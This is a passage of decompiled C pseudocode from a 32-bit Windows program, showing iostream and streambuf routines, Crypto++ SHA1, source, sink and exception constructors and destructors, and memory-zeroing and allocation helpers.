unsigned __int64 __thiscall sub_41C370(_DWORD **this, unsigned __int8 *Src, __int64 a3)
{
  int v3; // ebx
  size_t v4; // edi
  __int64 v5; // rax
  __int64 v6; // rax
  size_t v7; // esi
  bool v8; // cf
  _DWORD **v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+14h] [ebp-Ch]

  v3 = HIDWORD(a3);
  v10 = this;
  v4 = a3;
  v5 = a3;
  if ( a3 > 0 )
  {
    do
    {
      v6 = sub_41F6F0(this);
      v11 = HIDWORD(v6);
      v7 = v6;
      if ( v6 <= 0 )
      {
        if ( ((int (__thiscall *)(_DWORD **, _DWORD))(*v10)[3])(v10, *Src) == -1 )
          break;
        this = v10;
        v8 = v4-- != 0;
        v7 = 1;
        v3 = v8 + v3 - 1;
      }
      else
      {
        if ( __SPAIR64__(v3, v4) < v6 )
        {
          v7 = v4;
          v11 = v3;
        }
        memmove((void *)*v10[8], Src, v7);
        this = v10;
        v3 = (__PAIR64__(v3, v4) - __PAIR64__(v11, v7)) >> 32;
        v4 -= v7;
        *v10[12] -= v7;
        *v10[8] += v7;
      }
      Src += v7;
    }
    while ( v3 > 0 || v3 >= 0 && v4 );
    v5 = a3;
  }
  return v5 - __PAIR64__(v3, v4);
}

//----- (0041C450) --------------------------------------------------------
unsigned __int64 __thiscall sub_41C450(_DWORD **this, _BYTE *a2, __int64 a3)
{
  int v3; // ebx
  size_t v4; // edi
  __int64 v5; // rax
  __int64 v6; // rax
  size_t v7; // esi
  _BYTE *v8; // eax
  int v9; // eax
  char v10; // cl
  bool v11; // cf
  _DWORD **v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+14h] [ebp-Ch]

  v3 = HIDWORD(a3);
  v13 = this;
  v4 = a3;
  v5 = a3;
  if ( a3 > 0 )
  {
    do
    {
      v6 = sub_41F710(this);
      v14 = HIDWORD(v6);
      v7 = v6;
      if ( v6 <= 0 )
      {
        v9 = ((int (__thiscall *)(_DWORD **))(*v13)[7])(v13);
        v10 = v9;
        if ( v9 == -1 )
          break;
        v8 = a2;
        v11 = v4-- != 0;
        v7 = 1;
        v3 = v11 + v3 - 1;
        *a2 = v10;
        this = v13;
      }
      else
      {
        if ( __SPAIR64__(v3, v4) < v6 )
        {
          v7 = v4;
          v14 = v3;
        }
        memmove(a2, (const void *)*v13[7], v7);
        this = v13;
        v3 = (__PAIR64__(v3, v4) - __PAIR64__(v14, v7)) >> 32;
        v4 -= v7;
        *v13[11] -= v7;
        *v13[7] += v7;
        v8 = a2;
      }
      a2 = &v8[v7];
    }
    while ( v3 > 0 || v3 >= 0 && v4 );
    v5 = a3;
  }
  return v5 - __PAIR64__(v3, v4);
}

//----- (0041C530) --------------------------------------------------------
int __thiscall sub_41C530(_DWORD **this)
{
  int result; // eax
  _DWORD *v3; // ecx
  unsigned __int8 *v4; // edx

  result = ((int (__thiscall *)(_DWORD **))(*this)[6])(this);
  if ( result != -1 )
  {
    --*this[11];
    v3 = this[7];
    v4 = (unsigned __int8 *)(*v3)++;
    return *v4;
  }
  return result;
}

//----- (0041C560) --------------------------------------------------------
int __stdcall sub_41C560(int a1)
{
  return -1;
}

//----- (0041C570) --------------------------------------------------------
void __thiscall sub_41C570(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // ecx
  void (__thiscall ***v3)(_DWORD, int); // eax

  v1 = (_DWORD *)this[13];
  *this = &std::streambuf::`vftable';
  if ( v1 )
  {
    v2 = v1[1];
    if ( v2 )
    {
      v3 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v2 + 8))(v2);
      if ( v3 )
        (**v3)(v3, 1);
    }
    sub_46C87D(v1);
  }
}
// 4B8584: using guessed type void *std::streambuf::`vftable';

//----- (0041C5E0) --------------------------------------------------------
void __thiscall sub_41C5E0(struct std::ios_base *this)
{
  *(_DWORD *)this = &std::ios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';

//----- (0041C640) --------------------------------------------------------
_DWORD *__thiscall sub_41C640(_DWORD *this)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // ecx

  sub_435E90(this, 1);
  this[1] = 0;
  this[2] = 0;
  *((_BYTE *)this + 81) = 0;
  this[22] = 0x3FFFFFFF;
  this[23] = 16;
  if ( *((_BYTE *)this + 81) )
  {
    v2 = 0;
  }
  else
  {
    *((_BYTE *)this + 81) = 1;
    v2 = this + 4;
  }
  this[24] = v2;
  *((_BYTE *)this + 169) = 0;
  this[44] = 0x3FFFFFFF;
  this[45] = 16;
  if ( *((_BYTE *)this + 169) )
  {
    v3 = 0;
  }
  else
  {
    *((_BYTE *)this + 169) = 1;
    v3 = this + 26;
  }
  this[46] = v3;
  sub_45C280((_DWORD *)this[46]);
  *this = &CryptoPP::SHA1::`vftable';
  return this;
}
// 4BAA04: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (0041C720) --------------------------------------------------------
_DWORD *__thiscall sub_41C720(_DWORD *this, char a2)
{
  *this = &off_4BA264;
  this[1] = &off_4BA2B8;
  this[7] = &off_4BA2FC;
  this[12] = &off_4BA334;
  sub_417E70((int)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;

//----- (0041C7A0) --------------------------------------------------------
_DWORD *__thiscall sub_41C7A0(_DWORD *this, char a2)
{
  *this = &off_4BA264;
  this[1] = &off_4BA2B8;
  this[7] = &off_4BA2FC;
  this[12] = &off_4BA334;
  sub_417E70((int)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;

//----- (0041C820) --------------------------------------------------------
_DWORD *__thiscall sub_41C820(_DWORD *this, char a2)
{
  sub_4181B0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0041C850) --------------------------------------------------------
int __thiscall sub_41C850(int this)
{
  unsigned int v1; // edx
  void *v2; // edi
  int result; // eax

  v1 = *(_DWORD *)(this + 76);
  v2 = *(void **)(this + 80);
  if ( *(_DWORD *)(this + 72) < v1 )
    v1 = *(_DWORD *)(this + 72);
  if ( v2 == (void *)this )
  {
    *(_BYTE *)(this + 65) = 0;
    result = 0;
    memset(v2, 0, 4 * v1);
  }
  return result;
}

//----- (0041C8B0) --------------------------------------------------------
int __thiscall sub_41C8B0(char *this)
{
  char *v1; // ecx
  unsigned int v2; // edx
  char *v3; // edi
  int result; // eax

  v1 = this + 16;
  v2 = *((_DWORD *)v1 + 19);
  v3 = (char *)*((_DWORD *)v1 + 20);
  if ( *((_DWORD *)v1 + 18) < v2 )
    v2 = *((_DWORD *)v1 + 18);
  if ( v3 == v1 )
  {
    v1[65] = 0;
    result = 0;
    memset(v3, 0, 4 * v2);
  }
  return result;
}

//----- (0041C920) --------------------------------------------------------
int __thiscall sub_41C920(int this)
{
  unsigned int v1; // edx
  void *v2; // edi
  int result; // eax

  v1 = *(_DWORD *)(this + 76);
  v2 = *(void **)(this + 80);
  if ( *(_DWORD *)(this + 72) < v1 )
    v1 = *(_DWORD *)(this + 72);
  if ( v2 == (void *)this )
  {
    *(_BYTE *)(this + 65) = 0;
    result = 0;
    memset(v2, 0, 4 * v1);
  }
  return result;
}

//----- (0041C980) --------------------------------------------------------
_DWORD *__thiscall sub_41C980(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx

  *this = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  v3 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v3 )
    (**v3)(v3, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BA718: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7EC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';

//----- (0041C9F0) --------------------------------------------------------
char *__thiscall sub_41C9F0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  *(_DWORD *)this = &CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 4BABD0: using guessed type void *CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';

//----- (0041CA90) --------------------------------------------------------
_DWORD *__thiscall sub_41CA90(_DWORD *this, char a2)
{
  *this = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  this[1] = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BA584: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';
// 4BA63C: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';

//----- (0041CAC0) --------------------------------------------------------
char *__thiscall sub_41CAC0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::CannotFlush::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91F4: using guessed type void *CryptoPP::CannotFlush::`vftable';

//----- (0041CB60) --------------------------------------------------------
_DWORD *__thiscall sub_41CB60(_DWORD *this, char a2)
{
  sub_40AA00(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0041CBC0) --------------------------------------------------------
char *__thiscall sub_41CBC0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  *(_DWORD *)this = &CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 4B8954: using guessed type void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';

//----- (0041CC60) --------------------------------------------------------
char *__thiscall sub_41CC60(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 30);
  sub_40A070(this - 30);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}

//----- (0041CC90) --------------------------------------------------------
char *__thiscall sub_41CC90(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 26);
  sub_409FC0(this - 26);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}

//----- (0041CCC0) --------------------------------------------------------
_DWORD *__thiscall sub_41CCC0(_DWORD *this, char a2)
{
  sub_41A9E0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0041CCF0) --------------------------------------------------------
_DWORD *__thiscall sub_41CCF0(struct std::ios_base *this, char a2)
{
  _DWORD *v3; // edi

  v3 = (_DWORD *)((char *)this - 32);
  sub_41AAA0(this);
  *(_DWORD *)this = &std::wios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v3);
  return v3;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';

//----- (0041CD70) --------------------------------------------------------
char *__thiscall sub_41CD70(struct std::ios_base *this, char a2)
{
  char *v2; // esi

  v2 = (char *)this - 8;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8) = &std::wostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 12) = *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8;
  *(_DWORD *)this = &std::wios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4BD604: using guessed type void *std::wostream::`vftable';

//----- (0041CE00) --------------------------------------------------------
char *__thiscall sub_41CE00(struct std::ios_base *this, char a2)
{
  char *v2; // esi

  v2 = (char *)this - 24;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 24) = &std::wistream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 28) = *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 24;
  *(_DWORD *)this = &std::wios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4CF880: using guessed type void *std::wistream::`vftable';

//----- (0041CE90) --------------------------------------------------------
_DWORD *__thiscall sub_41CE90(_DWORD *this, char a2)
{
  _DWORD *v3; // edi
  int v4; // ecx
  void (__thiscall ***v5)(_DWORD, int); // eax

  v3 = (_DWORD *)this[13];
  *this = &std::wstreambuf::`vftable';
  if ( v3 )
  {
    v4 = v3[1];
    if ( v4 )
    {
      v5 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 8))(v4);
      if ( v5 )
        (**v5)(v5, 1);
    }
    sub_46C87D(v3);
  }
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BD57C: using guessed type void *std::wstreambuf::`vftable';

//----- (0041CF10) --------------------------------------------------------
struct std::ios_base *__thiscall sub_41CF10(struct std::ios_base *this, char a2)
{
  *(_DWORD *)this = &std::wios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';

//----- (0041CF80) --------------------------------------------------------
char *__thiscall sub_41CF80(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 104;
  sub_40A280(this - 104);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}

//----- (0041CFB0) --------------------------------------------------------
char *__thiscall sub_41CFB0(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 112;
  sub_414850(this - 112);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}

//----- (0041CFE0) --------------------------------------------------------
void *__thiscall sub_41CFE0(void *this, char a2)
{
  sub_41C100((int)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0041D010) --------------------------------------------------------
char *__thiscall sub_41D010(struct std::ios_base *this, char a2)
{
  char *v2; // esi

  v2 = (char *)this - 8;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 12) = *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8;
  *(_DWORD *)this = &std::ios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';

//----- (0041D0A0) --------------------------------------------------------
char *__thiscall sub_41D0A0(struct std::ios_base *this, char a2)
{
  char *v2; // esi

  v2 = (char *)this - 24;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 24) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 28) = *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 24;
  *(_DWORD *)this = &std::ios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B8640: using guessed type void *std::istream::`vftable';

//----- (0041D130) --------------------------------------------------------
_DWORD *__thiscall sub_41D130(_DWORD *this, char a2)
{
  _DWORD *v3; // edi
  int v4; // ecx
  void (__thiscall ***v5)(_DWORD, int); // eax

  v3 = (_DWORD *)this[13];
  *this = &std::streambuf::`vftable';
  if ( v3 )
  {
    v4 = v3[1];
    if ( v4 )
    {
      v5 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 8))(v4);
      if ( v5 )
        (**v5)(v5, 1);
    }
    sub_46C87D(v3);
  }
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8584: using guessed type void *std::streambuf::`vftable';

//----- (0041D1B0) --------------------------------------------------------
struct std::ios_base *__thiscall sub_41D1B0(struct std::ios_base *this, char a2)
{
  *(_DWORD *)this = &std::ios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';

//----- (0041D220) --------------------------------------------------------
_DWORD *__thiscall sub_41D220(_DWORD *this, char a2)
{
  _DWORD *v3; // esi

  v3 = this + 3;
  sub_40A6C0(this + 3);
  v3[15] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0041D2A0) --------------------------------------------------------
void *__thiscall sub_41D2A0(void *this, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0041D2C0) --------------------------------------------------------
void *__thiscall sub_41D2C0(void *this, char a2)
{
  sub_4184E0((int)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0041D320) --------------------------------------------------------
int __thiscall sub_41D320(void *this)
{
  return sub_4184E0((int)this);
}

//----- (0041D370) --------------------------------------------------------
int __thiscall sub_41D370(char *this)
{
  char *v1; // ecx
  unsigned int v2; // edx
  char *v3; // edi
  int result; // eax

  v1 = this + 16;
  v2 = *((_DWORD *)v1 + 19);
  v3 = (char *)*((_DWORD *)v1 + 20);
  if ( *((_DWORD *)v1 + 18) < v2 )
    v2 = *((_DWORD *)v1 + 18);
  if ( v3 == v1 )
  {
    v1[65] = 0;
    result = 0;
    memset(v3, 0, 4 * v2);
  }
  return result;
}

//----- (0041D3E0) --------------------------------------------------------
int __thiscall sub_41D3E0(int this, char a2)
{
  void *v4; // [esp-4h] [ebp-24h]

  v4 = *(void **)(this + 40);
  memset(v4, 0, *(_DWORD *)(this + 28 + (*(_DWORD *)(this + 32) < *(_DWORD *)(this + 36) ? 4 : 8)));
  j_j___free_base(v4);
  sub_406980((const char **)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}

//----- (0041D480) --------------------------------------------------------
const char **__thiscall sub_41D480(const char **this, char a2)
{
  sub_406980(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0041D4E0) --------------------------------------------------------
void __thiscall sub_41D4E0(char *this)
{
  char *v1; // edx

  v1 = this + 8;
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 8] = &std::wostream::`vftable';
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 12] = *(_DWORD *)(*(_DWORD *)this + 4) - 8;
  *((_DWORD *)this + 2) = &std::wios::`vftable';
  *((_DWORD *)this + 2) = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)(this + 8));
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4BD604: using guessed type void *std::wostream::`vftable';

//----- (0041D550) --------------------------------------------------------
void __thiscall sub_41D550(char *this)
{
  char *v1; // edx

  v1 = this + 8;
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 8] = &std::ostream::`vftable';
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 12] = *(_DWORD *)(*(_DWORD *)this + 4) - 8;
  *((_DWORD *)this + 2) = &std::ios::`vftable';
  *((_DWORD *)this + 2) = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)(this + 8));
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';

//----- (0041D5C0) --------------------------------------------------------
int __thiscall sub_41D5C0(int this, int a2)
{
  int v3; // edx
  void *v4; // ecx

  v3 = this + 16;
  *(_DWORD *)(this + 4) = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(this + 8) = *(_DWORD *)(a2 + 8);
  *(_BYTE *)(this + 81) = 0;
  *(_DWORD *)(this + 88) = *(_DWORD *)(a2 + 88);
  *(_DWORD *)(this + 92) = *(_DWORD *)(a2 + 92);
  if ( *(_DWORD *)(a2 + 92) > 0x10u || *(_BYTE *)(this + 81) )
  {
    v4 = 0;
  }
  else
  {
    *(_BYTE *)(this + 81) = 1;
    v4 = (void *)(this + 16);
  }
  *(_DWORD *)(v3 + 80) = v4;
  if ( *(_DWORD *)(a2 + 96) )
    sub_401670(v4, 4 * *(_DWORD *)(v3 + 76), *(void **)(a2 + 96), 4 * *(_DWORD *)(a2 + 92));
  return this;
}

//----- (0041D670) --------------------------------------------------------
void __thiscall sub_41D670(void **this)
{
  sub_46C87D(*this);
}

//----- (0041D6B0) --------------------------------------------------------
void __thiscall sub_41D6B0(int *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  v2 = *this;
  if ( v2 )
  {
    sub_4250C0(v2, this[1]);
    v3 = (_DWORD *)*this;
    if ( (unsigned int)(24 * ((this[2] - *this) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (0041D730) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char __thiscall sub_41D730(unsigned int *this, unsigned int a2)
{
  char result; // al
  unsigned int v4; // edi
  size_t v5; // eax
  void *v6; // eax
  void *v7; // ecx
  unsigned int v8; // eax
  char *v9; // eax

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( !a2 )
    return 0;
  if ( a2 > 0xAAAAAAA )
    sub_420130();
  v4 = 24 * a2;
  if ( 24 * a2 < 0x1000 )
  {
    if ( v4 )
    {
      v9 = (char *)operator new(24 * a2);
      *this = (unsigned int)v9;
      this[1] = (unsigned int)v9;
      this[2] = (unsigned int)&v9[v4];
      return 1;
    }
    else
    {
      *this = 0;
      this[1] = 0;
      result = 1;
      this[2] = 0;
    }
  }
  else
  {
    v5 = v4 + 35;
    if ( v4 + 35 <= v4 )
      v5 = -1;
    v6 = operator new(v5);
    v7 = v6;
    if ( !v6 )
      _invalid_parameter_noinfo_noreturn();
    v8 = ((unsigned int)v6 + 35) & 0xFFFFFFE0;
    *(_DWORD *)(v8 - 4) = v7;
    *this = v8;
    this[1] = v8;
    this[2] = v4 + v8;
    return 1;
  }
  return result;
}
// 41D7D6: bad sp value at call
// 420130: using guessed type void __noreturn sub_420130(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0041D7F0) --------------------------------------------------------
int __stdcall sub_41D7F0(int a1, int a2)
{
  int v3; // eax

  v3 = 20;
  do
  {
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 15;
    *(_BYTE *)a1 = 0;
    a1 += 24;
    --v3;
  }
  while ( v3 );
  sub_4250C0(a1, a1);
  return a1;
}

//----- (0041D8A0) --------------------------------------------------------
unsigned int __stdcall sub_41D8A0(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int result; // eax

  result = a4;
  if ( a3 - a2 < a4 )
    return a3 - a2;
  return result;
}

//----- (0041D8E0) --------------------------------------------------------
int __stdcall sub_41D8E0(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, _DWORD *a7)
{
  *a4 = a2;
  *a7 = a5;
  return 3;
}

//----- (0041D900) --------------------------------------------------------
int __thiscall sub_41D900(_BYTE **this)
{
  int result; // eax
  int v3; // ecx

  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(*this);
  result = *(_DWORD *)(*(_DWORD *)*this + 4);
  v3 = *(_DWORD *)&(*this)[result + 56];
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (0041D970) --------------------------------------------------------
_BYTE *__thiscall sub_41D970(_BYTE *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  int v5; // esi
  int v6; // ecx
  int v7; // ecx
  _BYTE *v9; // [esp+10h] [ebp-18h]
  char v10; // [esp+14h] [ebp-14h]

  *(_DWORD *)this = a2;
  v3 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)a2 + 4) + a2 + 56);
  if ( v3 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v4 = *(_DWORD *)(*(_DWORD *)a2 + 4);
  if ( !*(_DWORD *)(v4 + a2 + 12) )
  {
    v5 = *(_DWORD *)(v4 + a2 + 60);
    if ( v5 )
    {
      if ( v5 != a2 && *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v5 + 4) + v5 + 56) )
      {
        sub_41D970(v5);
        if ( v10 )
        {
          v6 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v5 + 4) + v5 + 56);
          if ( (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 52))(v6) == -1 )
            sub_4036A0(
              (_DWORD *)(v5 + *(_DWORD *)(*(_DWORD *)v5 + 4)),
              *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v5 + 4) + v5 + 12) | 4,
              0);
        }
        if ( !(unsigned __int8)j____uncaught_exception() )
          sub_421050(v9);
        v7 = *(_DWORD *)&v9[*(_DWORD *)(*(_DWORD *)v9 + 4) + 56];
        if ( v7 )
          (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 8))(v7);
      }
    }
  }
  this[4] = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)a2 + 4) + a2 + 12) == 0;
  return this;
}
// 41D9F4: variable 'v10' is possibly undefined
